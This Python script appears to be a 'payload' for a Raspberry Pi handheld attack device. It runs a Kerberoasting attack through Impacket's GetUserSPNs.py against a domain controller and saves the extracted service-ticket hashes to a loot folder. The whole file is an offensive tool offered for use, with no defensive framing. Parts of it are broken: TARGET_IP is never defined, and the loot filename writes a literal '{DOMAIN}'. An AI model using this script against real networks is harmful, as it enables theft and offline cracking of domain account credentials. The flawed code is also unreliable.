#!/usr/bin/env python3
"""
KTOx *payload* – **Kerberoasting Attack**
==============================================
This payload performs a Kerberoasting attack, which requests service tickets
for users with a Service Principal Name (SPN) and extracts the crackable
part of the ticket.

Features:
- Interactive UI for entering the domain, username, and password.
- Uses Impacket's GetUserSPNs.py to perform the attack.
- The attack runs in a background thread.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start the attack.
    - KEY1: Edit the domain.
    - KEY2: Edit the username.
    - KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

DOMAIN = "example.com"
USERNAME = "user"
PASSWORD = "password"
running = True
attack_thread = None

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Kerberoasting Attack", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (128 - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (128 - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), f"Domain: {DOMAIN}", font=FONT, fill="white")
        d.text((5, 50), f"User: {USERNAME}", font=FONT, fill="white")
        d.text((5, 100), "OK=Attack", font=FONT, fill="cyan")
        d.text((5, 110), "KEY1=Domain | KEY2=User", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"Domain: {DOMAIN}", font=FONT, fill="white")
        d.text((5, 85), f"User: {USERNAME}", font=FONT, fill="white")

    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    draw_ui("attacking")
    
    # Path to GetUserSPNs.py
    get_user_spns_path = os.path.join(KTOX_ROOT, "impacket-examples", "GetUserSPNs.py")
    
    # Command to execute
    command = [
        "python3",
        get_user_spns_path,
        "-request",
        "-dc-ip",
        TARGET_IP,
        f"{DOMAIN}\\{USERNAME}:{PASSWORD}"
    ]
    
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=600)
        
        if process.returncode == 0:
            draw_ui(message_lines=["Attack successful!", "Hashes saved to loot."])
            
            # Save the output to a loot file
            loot_dir = os.path.join(KTOX_ROOT, "loot", "kerberoasting")
            os.makedirs(loot_dir, exist_ok=True)
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            loot_file = os.path.join(loot_dir, f"kerberoasting_{{DOMAIN}}_{timestamp}.txt")
            with open(loot_file, "w") as f:
                f.write(stdout)
        else:
            draw_ui(message_lines=["Attack failed!", "Check console."])
            print(stderr)
            
    except subprocess.TimeoutExpired:
        draw_ui(message_lines=["Attack timed out!"])
    except Exception as e:
        draw_ui(message_lines=["Attack failed!", str(e)])
        
    time.sleep(3)

def handle_text_input_logic(initial_text, text_type):
    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
    char_index = 0
    input_text = ""
    
    while running:
        img = Image.new("RGB", (128, 128), "black")
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {text_type}", font=FONT_TITLE, fill="cyan")
        d.line([(0, 22), (128, 22)], fill="cyan", width=1)
        d.text((5, 40), f"{text_type}: {input_text}", font=FONT, fill="white")
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill="cyan")
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill="cyan")
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        if btn == "OK":
            input_text += char_set[char_index]
            time.sleep(0.2)
        if btn == "KEY1":
            input_text = input_text[:-1]
            time.sleep(0.2)
        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)
        if GPIO.input(PINS["KEY2"]) == 0:
            if input_text:
                return input_text
            else:
                draw_ui(message_lines=["Input cannot be empty!"])
                time.sleep(2)
        
        time.sleep(0.1)
    return None

if __name__ == "__main__":
    try:
        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["OK"]) == 0:
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.start()
                time.sleep(0.3)
            
            if GPIO.input(PINS["KEY1"]) == 0:
                new_domain = handle_text_input_logic(DOMAIN, "Domain")
                if new_domain:
                    DOMAIN = new_domain
                time.sleep(0.3)

            if GPIO.input(PINS["KEY2"]) == 0:
                new_username = handle_text_input_logic(USERNAME, "Username")
                if new_username:
                    USERNAME = new_username
                
                new_password = handle_text_input_logic(PASSWORD, "Password")
                if new_password:
                    PASSWORD = new_password
                time.sleep(0.3)

            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Kerberoasting Attack payload finished.")
